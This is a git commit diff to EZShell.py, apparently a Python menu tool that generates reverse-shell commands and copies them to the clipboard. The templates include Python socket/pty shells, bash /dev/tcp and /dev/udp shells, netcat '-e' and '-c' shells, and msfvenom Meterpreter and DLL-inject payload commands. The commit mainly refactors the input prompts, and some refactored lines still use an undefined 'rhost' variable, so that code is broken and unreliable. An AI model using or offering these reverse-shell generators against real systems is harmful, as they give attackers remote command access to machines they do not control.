f496323e973bcb23f7e89b7f1f7297ae883dedab
Shx-rp <45079643+Shx-rp@users.noreply.github.com>
2022-11-07 14:20:09 +0000

    V0.95

--- EZShell.py
+++ EZShell.py
@@ -2,6 +2,39 @@
 import pyperclip as clip
 import os
 
+
+def shellsType(selectLib):
+    global shellType
+    os.system("clear")
+    shellType = int(input(''' 
+    _______Shell Type________
+    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
+    while shellType >= 4 and shellType != 9 or shellType < 0:
+        os.system("clear")
+        shellType = int(input(''' 
+    _______Shell Type________
+    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
+    if shellType == 1:
+        shellType = "sh" 
+    elif shellType == 2:
+        shellType = "bash"
+    elif shellType == 3:
+        shellType = "powershell"
+    elif shellType == 9:
+        os.system("clear")
+        subMenu(selectLib)
+
+
+def hostport(selectLib):
+    global host
+    global port
+    if selectLib >= 3:
+        host = input("RHOST= ")
+        port = input("PORT= ")
+    if selectLib == 4:
+        host = input("LHOST= ")
+        port = input("PORT= ")
+
 def verbose():
         global verbose
         verbose = int(input("Do you wish to add verbose Y = 1 N = 0 : "))
@@ -20,24 +53,28 @@ def subMenu(selectLib):
     _______PYTHON________
     \n[1]. Python 2.7 \n[2]. Python 2.7 W/ Exports \n[3]. Python 3\n[4]. Python 3 W/ Exports \n[9]. Back to Main Menu
           ''')
+        pysubprocess(selectLib)
 
     if selectLib == 2:
         print('''
     ________BASH_________
     \n[1]. BASH -i \n[2]. BASH 196 \n[3]. BASH -i 5 \n[4]. BASH -i UDP \n[9]. Back to Main Menu
           ''')
+        bashsubprocess(selectLib)
 
     if selectLib == 3:
         print(''' 
     _______NETCAT________
     \n[1]. nc -e \n[2]. nc -c \n[9]. Back To main Menu
           ''')
+        ncsubprocess(selectLib)
 
     if selectLib == 4:
         print('''
     ______MSFVENOM_______
     \n[1]. Meterpreter Staged x64 Rev. TCP \n[2]. Meterpreter Unstaged x64 Rev. TCP \n[3]. Stage Reverse TCP \n[4]. Windows DLLInject \n[9]. Exit
           ''')
+        venomsubprocess(selectLib)
 
 def platformSystem(selectShell, selectLib):
     global platform
@@ -77,15 +114,16 @@ def platformMenu(selectShell):
 def venomsubprocess(selectLib):
     global platform
     global ext
+    global host
+    global port
     selectShell = int(input("Select Shell: "))
     if selectShell == 1:
-        lhost = input("LHOST= ")
-        lport = input("LPORT= ")
+        hostport(selectLib) 
         os.system("clear")
         platformMenu(selectShell)
         platformSystem(selectShell, selectLib)
         name = input("Insert Name for exploit: ")
-        shell = "msfvenom -p {0}/meterpreter/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
+        shell = "msfvenom -p {0}/meterpreter/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, host, port, name, ext)
         print(shell)
         clip.copy(shell)
         print("Copied to clipboard")
@@ -124,13 +162,12 @@ def venomsubprocess(selectLib):
                     exit()
 
     if selectShell == 2:
-        lhost = input("LHOST= ")
-        lport = input("LPORT= ")
+        hostport(selectLib)
         os.system("clear")
         platformMenu(selectShell)
         platformSystem(selectShell, selectLib)
         name = input("Insert Name for exploit: ")
-        shell = "msfvenom -p {0}/meterpreter_reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
+        shell = "msfvenom -p {0}/meterpreter_reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, host, port, name, ext)
         print(shell)
         clip.copy(shell)
         print("Copied to clipboard")
@@ -168,13 +205,12 @@ def venomsubprocess(selectLib):
                     print("\nCommand has been executed **With** Root priveleges!")
                     exit()
     if selectShell == 3:
-        lhost = input("LHOST= ")
-        lport = input("LPORT= ")
+        hostport(selectLib)
         os.system("clear")
         platformMenu(selectShell) 
         platformSystem(selectShell, selectLib)
         name = input("Insert Name for exploit: ")
-        shell = "msfvenom -p {0}/shell/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
+        shell = "msfvenom -p {0}/shell/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, host, port, name, ext)
         print(shell)
         clip.copy(shell)
         print("Copied to clipboard")
@@ -212,11 +248,10 @@ def venomsubprocess(selectLib):
                     print("\nCommand has been executed **With** Root priveleges!")
                     exit()
     if selectShell == 4:
-        lhost = input("LHOST= ")
-        lport = input("LPORT= ")
+        hostport(selectLib)
         os.system("clear")
         name = input("\nInsert Name for exploit: ")
-        shell = "msfvenom -p windows/dllinject/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(lhost, lport, name)
+        shell = "msfvenom -p windows/dllinject/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host, port, name)
         print(shell)
         clip.copy(shell)
         print("Copied to clipboard")
@@ -265,110 +300,37 @@ def venomsubprocess(selectLib):
 
 
 def pysubprocess(selectLib):
+    global host
+    global port
+    global shellType
     selectShell = int(input("Select Shell: "))
     if selectShell == 1:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            pysubprocess(selectLib)
-        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
+        hostport(selectLib)
+        shellsType(selectLib)
+        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("\n Copied to Clipboard!")
         exit()
     if selectShell == 2:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            pysubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
         print("\n Copied to Clipboard!")
         exit()
     if selectShell == 3:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType <0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            pysubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
         print("\n Copied to Clipboard!")
         exit()
     if selectShell == 4:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            pysubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
@@ -383,111 +345,37 @@ def pysubprocess(selectLib):
 
 
 def bashsubprocess(selectLib):
+    global host
+    global port
+    global shellType
     selectShell = int(input("Select Shell: "))
     if selectShell == 1:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            bashsubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell = "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
         exit()
     if selectShell == 2:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            bashsubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
         exit()
     if selectShell == 3:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            bashsubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell = "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
         exit()
     if selectShell == 4:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-         os.system("clear")
-         shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            bashsubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell = "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(rhost, port,shellType)
         print(shell)
         clip.copy(shell)
@@ -502,57 +390,22 @@ def bashsubprocess(selectLib):
 
 
 def ncsubprocess(selectLib):
+    global host
+    global port
+    global shellType
     selectShell = int(input("Select Shell: ")) 
     if selectShell == 1:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-            os.system("clear")
-            shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh" 
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        elif shellType == 9:
-                os.system("clear")
-                subMenu(selectLib)
-                ncsubprocess(selectLib)
-        shell = "nc {0} {1} -e {2}".format(rhost, port, shellType)
+        hostport(selectLib)
+        shellsType(selectLib)
+        shell = "nc {0} {1} -e {2}".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboartd!")
         exit()
 
     if selectShell == 2:
-        rhost = input("RHOST= ")
-        port = input("PORT= ")
-        os.system("clear")
-        shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9 or shellType < 0:
-            os.system("clear")
-            shellType = int(input(''' 
-    _______Shell Type________
-    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        if shellType == 1:
-            shellType = "sh"
-        elif shellType == 2:
-            shellType = "bash"
-        elif shellType == 3:
-            shellType = "powershell"
-        if shellType == 9:
-            os.system("clear")
-            subMenu(selectLib)
-            ncsubprocess(selectLib)
+        hostport(selectLib)
+        shellsType(selectLib)
         shell = "nc -c {2} {0} {1} ".format(rhost, port, shellType)
         print(shell)
         clip.copy(shell)
@@ -563,7 +416,6 @@ def ncsubprocess(selectLib):
     else:
         os.system("clear")
         subMenu(selectLib)
-        ncsubprocess(selectLib)
 
 def main():  
     os.system("clear")
@@ -573,19 +425,15 @@ def main():
     if selectLib == 1:
         os.system("clear")
         subMenu(selectLib)
-        pysubprocess(selectLib)
     elif selectLib == 2:
         os.system("clear")
         subMenu(selectLib)
-        bashsubprocess(selectLib)
     elif selectLib == 3:
         os.system("clear")
         subMenu(selectLib)
-        ncsubprocess(selectLib)
     elif selectLib == 4:
         os.system("clear")
         subMenu(selectLib)
-        venomsubprocess(selectLib)
 
     elif selectLib == 9:
         exit()
